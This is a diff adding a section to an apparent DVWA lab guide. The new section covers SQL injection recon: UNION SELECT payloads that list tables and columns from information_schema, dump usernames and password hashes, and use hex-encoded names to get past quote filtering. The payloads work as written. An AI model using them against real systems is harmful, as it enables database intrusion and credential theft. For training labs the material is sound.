@@ -83,3 +83,57 @@ DVWA stores passwords as MD5. Copy a hash out of the response and either:
 | High   | Burp Repeater       | `1' UNION SELECT user, password FROM users LIMIT 1,1-- -` |
 
 **Rule of thumb:** Low = quotes work, free text. Medium = quotes stripped, numeric only, needs Burp because of dropdown. High = quotes stripped + LIMIT 1 + session required, needs Burp Repeater for row-by-row extraction.
+
+---
+
+## Full database recon — enumerate tables/columns before dumping
+
+Instead of assuming `users`/`user`/`password` exist, pull them from
+`information_schema` first. Same 3-step process at every level; only the
+quoting changes.
+
+### Low & Medium — standard string literals work
+
+**Step A — list all tables in the `dvwa` database:**
+```sql
+1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='dvwa'-- -
+```
+
+**Step B — list columns in the `users` table:**
+```sql
+1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users'-- -
+```
+
+**Step C — dump the data once columns are known:**
+```sql
+1' UNION SELECT user, password FROM dvwa.users-- -
+```
+(Medium: send through Burp with quotes removed, same as the main Medium payload above — numeric form works here too.)
+
+### High — quotes filtered, use Hex instead
+
+High may block/strip `'`. Bypass by converting database/table names to hex —
+no quotes needed at all.
+
+```
+dvwa   in hex = 0x64767761
+users  in hex = 0x7573657273
+```
+
+**Step A — list tables (hex):**
+```sql
+1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=0x64767761-- -
+```
+
+**Step B — list columns (hex):**
+```sql
+1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema=0x64767761 AND table_name=0x7573657273-- -
+```
+
+Then dump with the same Hex-safe approach and Burp Repeater flow (`LIMIT` offset) from the High section above.
+
+**Converting any other string to hex (Linux/Kali):**
+```bash
+echo -n "tablename" | xxd -p
+```
+
